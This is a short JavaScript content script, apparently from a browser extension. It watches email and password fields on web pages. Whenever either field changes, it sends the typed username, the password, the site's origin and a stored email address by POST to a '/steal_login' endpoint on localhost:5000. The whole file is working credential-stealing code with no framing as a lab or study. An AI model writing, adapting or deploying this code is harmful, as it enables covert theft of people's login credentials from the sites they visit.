
var username = $('[type="username"]');
var email = $('[type="email"]');
var password = $('[type="password"]');

email.change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        $.post("http://localhost:5000/steal_login", {
            email: userEmail,
            url: window.location.origin,
            username: email.val(),
            password: password.val()
        });
    });
});

password.change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        $.post("http://localhost:5000/steal_login", {
            email: userEmail,
            url: window.location.origin,
            username: email.val(),
            password: password.val()
        });
    });
});